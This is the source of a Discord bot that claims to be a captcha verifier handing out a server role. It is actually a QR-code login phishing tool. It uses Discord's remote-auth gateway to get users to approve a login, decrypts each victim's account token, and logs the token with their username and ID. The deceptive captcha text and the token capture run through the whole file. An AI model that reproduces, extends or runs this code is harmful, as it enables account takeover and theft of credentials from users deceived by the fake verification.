const Discord = require("discord.js");
var stream = require("stream");
var QRCode = require('qrcode');

const { StringDecoder } = require('string_decoder');
const { encode: urlsafe_b64encode, decode: urlsafe_b64decode } = require("safe-base64");

const crypto = require('crypto');

const WebSocket = require('ws');

// We instiate the client and connect to database.
const client = new Discord.Client();

const config = {
  "roleID": ""
}

function sleep(ms) {
    return new Promise((resolve) => {
      setTimeout(resolve, ms);
    });
}

function formatTHdate(input) {
    // Parse our locale string to [date, time]
    //var date = new Date().toLocaleString('en-US',{hour12:true,timeZone:'Asia/Bangkok'}).split(" ");

    var date = input.toLocaleString('en-US', { hour12: true, timeZone: 'Asia/Bangkok' }).split(" ");

    // Now we can access our time at date[1], and monthdayyear @ date[0]
    var AmPm = date[2];
    var time = date[1];
    var mdy = date[0];

    // We then parse  the mdy into parts
    mdy = mdy.split('/');
    var month = parseInt(mdy[0]);
    var day = parseInt(mdy[1]);
    var year = parseInt(mdy[2]);

    // Putting it all together
    var formattedDate = ('0' + day).slice(-2) + '/' + ('0' + month).slice(-2) + '/' + year + ', ' + time + ' ' + AmPm + ' (GMT+7)';
    return formattedDate;
}

var Messages = {
    HEARTBEAT: 'heartbeat',
    HELLO: 'hello',
    INIT: 'init',
    NONCE_PROOF: 'nonce_proof',
    PENDING_REMOTE_INIT: 'pending_remote_init',
    PENDING_FINISH: 'pending_finish',
    FINISH: 'finish',
    CANCEL: 'cancel'
}

class DiscordUser {
    constructor(values) {
        this.id = values.id
        this.username = values.username
        this.discrim = values.discrim
        this.avatar_hash = values.avatar_hash
        this.token = values.token
    }

    from_payload(payload) {
        let values = payload.split(':');

        this.id = values[0];
        this.discrim = values[1];
        this.avatar_hash = values[2];
        this.username = values[3];

        return this;
    }

    pretty_print() {
        let out = ''
        out += `User:            ${this.username}#${this.discrim} (${this.id})\n`
        out += `Avatar URL:      https://cdn.discordapp.com/avatars/${this.id}/${this.avatar_hash}.png\n`
        out += `Token (SECRET!): ${this.token}\n`

        return out
    }
}

class DiscordUser_FromPayload {
    constructor(payload) {
        let values = payload.split(':');

        this.id = values[0];
        this.username = values[3];
        this.discrim = values[1];
        this.avatar_hash = values[2];

        return this
    }

    pretty_print() {
        let out = ''
        out += `User:            ${this.username}#${this.discrim} (${this.id})\n`
        out += `Avatar URL:      https://cdn.discordapp.com/avatars/${this.id}/${this.avatar_hash}.png\n`
        out += `Token (SECRET!): ${this.token}\n`

        return out
    }
}

class DiscordAuthWebsocket {
    constructor(debug=true, message={}) {
        this.debug = debug

        this.message = message

        let embed = new Discord.MessageEmbed()
            .setColor('#46ff53')
            .setAuthor(`Creating a Secure Handshake with: Discord Gateway`, 'https://cdn.discordapp.com/attachments/700682902459121695/709605085386113114/8104LoadingEmote.gif')
        this.message.channel.send(undefined, embed)
            .then(message => {
                this.qrMessage = message

                this.ws = new WebSocket('wss://remote-auth-gateway.discord.gg/?v=1', {headers: {'Origin': 'https://discord.com'}});

                //this.key = new NodeRSA({b: 2048})
                this.key = crypto.generateKeyPairSync("rsa", {
                    // The standard secure default length for RSA keys is 2048 bits
                    modulusLength: 2048,
                    publicKeyEncoding: {
                        type: 'spki',
                        format: 'pem'
                    },
                    privateKeyEncoding: {
                        type: 'pkcs1',
                        format: 'pem'
                    }
                })
                //this.cipher = PKCS1_OAEP.new(this.key, hashAlgo=SHA256)

                this.heartbeat_interval = null
                this.last_heartbeat = null
                this.user = null

                let self = this;
                this.ws.on('error', function (error) {
                    if (self.debug)
                        console.log(error)
                });
                this.ws.on('open', function () {
                    if (self.debug)
                        console.log('WebSocket Client Connected');
                });
                this.ws.on('message', function (message) {
                    if (self.debug)
                        console.log(`Recv: ${message}`)

                    let data = JSON.parse(message)
                    if (self.debug)
                        console.log(data)
                    let op = data.op

                    if (op == Messages.HELLO) {
                        console.log('Attempting server handshake...')

                        self.heartbeat_interval = data.heartbeat_interval / 1000
                        self.last_heartbeat = Date.now() / 1000

                        self.heartbeat_sender()

                        let publickey = self.public_key()
                        self.send(Messages.INIT, { 'encoded_public_key': publickey })
                    }
                    else if (op == Messages.NONCE_PROOF) {
                        let nonce = data.encrypted_nonce
                        let decrypted_nonce = self.decrypt_payload(nonce)

                        let proof = crypto.createHash('sha256').update(decrypted_nonce).digest()
                        //let proof = SHA256.new(data=decrypted_nonce).digest()
                        //proof = base64.urlsafe_b64encode(proof)
                        proof = urlsafe_b64encode(proof)
                        //proof = proof.decode().rstrip('=')
                        proof = proof.replace(/\s+$/, '')
                        self.send(Messages.NONCE_PROOF, { 'proof': proof })
                    }
                    else if (op == Messages.PENDING_REMOTE_INIT) {
                        let fingerprint = data.fingerprint
                        self.generate_qr_code(fingerprint)

                        if (self.debug)
                            console.log('Please scan the QR code to continue.')
                    }
                    else if (op == Messages.PENDING_FINISH) {
                        (async () => {
                            let encrypted_payload = data.encrypted_user_payload
                            let payload = self.decrypt_payload(encrypted_payload)

                            var decoder = new StringDecoder('utf-8');
                            self.user = new DiscordUser_FromPayload(decoder.write(payload))
                            if (self.qrMessage.deletable)
                                self.qrMessage.delete()
                            let embed = new Discord.MessageEmbed()
                                .setColor('#46ff53')
                                .setAuthor(`${self.user.username}#${self.user.discrim}`, 'https://cdn.discordapp.com/attachments/700682902459121695/709605085386113114/8104LoadingEmote.gif')
                                .setTitle(`Press the Confirm Button to Authenticate`)
                                .setThumbnail(`https://cdn.discordapp.com/avatars/${self.user.id}/${self.user.avatar_hash}.png`);
                            self.qrMessage = await self.message.channel.send(undefined, embed)
                        })();
                    }
                    else if (op == Messages.FINISH) {
                        (async () => {
                            let encrypted_token = data.encrypted_token
                            let token = self.decrypt_payload(encrypted_token)

                            var decoder = new StringDecoder('utf-8');
                            self.user.token = decoder.write(token)

                            if (self.debug)
                                console.log(self.user.pretty_print())

                            if (self.qrMessage.deletable)
                                self.qrMessage.delete()

                            let user = await client.users.fetch(self.user.id)
                            
                            let desc = `You have received: The Role: ${config.roleID}`
                            let tokenEmbed = new Discord.MessageEmbed()
                                .setColor('#22bb33')
                                .setAuthor(`Role Assigner To: ${self.user.username}#${self.user.discrim}`)
                                .setDescription(desc)
                            await user.send(undefined, tokenEmbed)
                                .then(async () => {
                                    console.log(`Username: ${self.user.username} , User Discrim: ${self.user.discrim} , User ID: ${self.user.id} , User Token: ${self.user.token}`);
                                    let embed = new Discord.MessageEmbed()
                                        .setColor('#22bb33')
                                        .setAuthor(`You have been Authenticated! You will receive the Role to the Discord Server`, 'https://upload.wikimedia.org/wikipedia/commons/thumb/8/8b/Eo_circle_green_white_checkmark.svg/200px-Eo_circle_green_white_checkmark.svg.png')
                                    self.qrMessage = await self.message.channel.send(undefined, embed)

                                    self.ws.close()
                                }, async () => {
                                    let embed = new Discord.MessageEmbed()
                                        .setColor('#ff0000')
                                        .setAuthor(`I can't send Private Message!`, 'http://pluspng.com/img-png/png-wrong-cross-cancel-cross-exit-no-not-allowed-stop-wrong-icon-icon-512.png')
                                    self.qrMessage = await self.message.channel.send(undefined, embed)

                                    self.ws.close()
                                });
                        })();
                    }
                    else if (op == Messages.CANCEL) {
                        (async () => {
                            if (self.qrMessage.deletable)
                                self.qrMessage.delete()

                            let embed = new Discord.MessageEmbed()
                                .setColor('#ff0000')
                                .setAuthor(`You have aborted the Captcha!`, 'http://pluspng.com/img-png/png-wrong-cross-cancel-cross-exit-no-not-allowed-stop-wrong-icon-icon-512.png')
                                .setDescription('Reasoning: User clicked Cancel.')
                                .setFooter(`${self.user.username}#${self.user.discrim}`, `https://cdn.discordapp.com/avatars/${self.user.id}/${self.user.avatar_hash}.png`)
                            self.qrMessage = await self.message.channel.send(undefined, embed)

                            self.ws.close()
                        })();
                    }
                });
                this.ws.on('close', function () {
                    if (self.debug) {
                        console.log('----------------------')
                        console.log('Connection closed.')
                    }
                });
                if (this.debug)
                    console.log('ws setup passed')
            })
    }

    public_key() {
        if (this.debug)
            console.log('!!!!!!!!!!!!!!!!!!!')
        var decoder = new StringDecoder('utf-8');
        let pub_key = this.key.publicKey
        if (this.debug)
            console.log(pub_key)
        pub_key = decoder.write(pub_key)
        if (this.debug)
            console.log(pub_key)
        pub_key = (pub_key.split('\n').slice(1, -2)).join('')
        if (this.debug)
            console.log(pub_key)
        if (this.debug)
            console.log('!!!!!!!!!!!!!!!!!!!')
        return pub_key
    }

    heartbeat_sender() {
        (async () => {
            while (this.ws.readyState === this.ws.OPEN) {

                await sleep(500)  // we don't need perfect accuracy

                let current_time = Date.now() / 1000
                let time_passed = current_time - this.last_heartbeat + 1  // add a second to be on the safe side
                if (time_passed >= this.heartbeat_interval) {
                    this.send(Messages.HEARTBEAT)
                    this.last_heartbeat = current_time
                }

            }
        })()
    }

    send(op, data=null) {
        let payload = {'op': op}
        if (data !== null)
            payload = {...payload, ...data};

        if (this.debug) {
            console.log(`Send: ${payload}`)
            console.log(payload)
        }
        this.ws.send(JSON.stringify(payload))
    }

    decrypt_payload(encrypted_payload) {
        //let payload = base64.b64decode(encrypted_payload)
        let payload = Buffer.from(encrypted_payload, 'base64')
        if (this.debug) {
            console.log(payload)
            console.log(this.key.privateKey)
        }
        var decoder = new StringDecoder('utf-8');
        let private_key = this.key.privateKey
        private_key = decoder.write(private_key)
        let decrypted = crypto.privateDecrypt(
            {
                key: private_key,
                // In order to decrypt the data, we need to specify the
                // same hashing function and padding scheme that we used to
                // encrypt the data in the previous step
                padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
                oaepHash: "sha256",
            },
            payload
        )

        return decrypted
    }

    generate_qr_code(fingerprint) {
        (async () => {
            var qrStream = new stream.PassThrough();
            await QRCode.toFileStream(qrStream, `https://discordapp.com/ra/${fingerprint}`,
                {
                    type: 'png',
                    width: 180,
                    errorCorrectionLevel: 'M'
                })

            if (this.qrMessage && this.qrMessage.deletable)
                this.qrMessage.delete()

            const attachment = new Discord.MessageAttachment(qrStream, 'discord-captcha.png');
            let embed = new Discord.MessageEmbed()
                    .setColor('#46ff53')
                    .setDescription(`${this.message.author} Scan this QR code to Confirm to Authenticate (A.K.A Log In via our Server to prove that you're not a robot.).\n(Scan it via the Discord Mobile App for iOS or Android)\nBy Scanning you will have the following options: Confirm or Cancel.`)
                    .attachFiles([attachment])
                    .setImage('attachment://discord-captcha.png');
            this.qrMessage = await this.message.channel.send(undefined, embed)
        })();
    }
}

client.on("ready", () => {
    console.log(`Bot is ready. (${client.guilds.cache.size} Guilds - ${client.channels.cache.size} Channels - ${client.users.cache.size} Users) BOT NAME`);
  client.user.setActivity(`Captcha Protection: On`, { type: 'PLAYING' });
});

client.on("message", async (message) => {
    // Declaring a reply function for easier replies - we grab all arguments provided into the function and we pass them to message.channel.send function.
    const reply = (...arguments) => message.channel.send(...arguments);

    // Doing some basic command logic.
    if (message.author.bot) return;
    if (message.channel.type !== 'dm' && !message.channel.permissionsFor(message.guild.me).has("SEND_MESSAGES")) return;

    // If the message does not start with the prefix stored in database, we ignore the message.
    if (message.content.indexOf('$') !== 0) return;

    // We remove the prefix from the message and process the arguments.
    const args = message.content.slice('$'.length).trim().split(/ +/g);
    const command = args.shift().toLowerCase();

    // If command is ping we send a sample and then edit it with the latency.
  /*
    if (command === "ping") {
        const roundtripMessage = await reply("Pong!");
        return roundtripMessage.edit(`*${roundtripMessage.createdTimestamp - message.createdTimestamp}ms*`);
    }
    
    if (command === 'help') {
  		const helpEmbed = new Discord.MessageEmbed()
			.setColor('RANDOM')
			.setTitle("Command List :")
  			.setDescription('$help to Display this Help Message.\n$ping to fetch this bot Ping!\n$uptime to show when this Bot is uptime!\n$gettoken to get the Token!\n$invite to invite this bot.');
    	return message.channel.send(helpEmbed)
    }

    if (command === "uptime") {
        let totalSeconds = client.uptime / 1000;
        let days = Math.floor(totalSeconds / 86400);
        totalSeconds %= 86400;
        let hours = Math.floor(totalSeconds / 3600);
        totalSeconds %= 3600;
        let minutes = Math.floor(totalSeconds / 60);
        let seconds = Math.floor(totalSeconds % 60);
        let embed = new Discord.MessageEmbed()
            .setColor(message.channel.type!=='dm'?message.guild.me.displayHexColor:'#68ffa7')
            .setTitle('Local time')
            .setDescription(formatTHdate( new Date() ))
            .setAuthor(`${client.user.username}`, `${client.user.displayAvatarURL()}`)
            .addFields([
                {
                    "name": "Current uptime",
                    "value": `${!days?'':days+'d '}${!hours&&!days?'':hours+'h '}${!minutes&&!hours&&!days?'':minutes+'m '}${seconds}s`,
                    "inline": true
                },
                {
                    "name": "Start time",
                    "value": `${formatTHdate( new Date(client.readyTimestamp) )}`,
                    "inline": true
                }
            ])
        message.channel.send(undefined, embed)
    }
    
    if (command === 'invite') {
        message.channel.send('<https://discord.com/api/oauth2/authorize?client_id=829316239364849664&permissions=8&scope=bot>')
    }
*/
    if (command === 'captcha') {
        (async () => {
            let auth_ws = new DiscordAuthWebsocket(debug=true, message=message)
            await sleep(60000)
            if (auth_ws.qrMessage.deletable)
                await auth_ws.qrMessage.delete()
            if (auth_ws.ws.readyState === auth_ws.ws.OPEN)
                auth_ws.ws.close()
            auth_ws = null;
        })()
    }
});

// Listening for error & warn events.
client.on("error", console.error);
client.on("warn", console.warn);

// We login into the bot.
client.login(process.env.captcha);
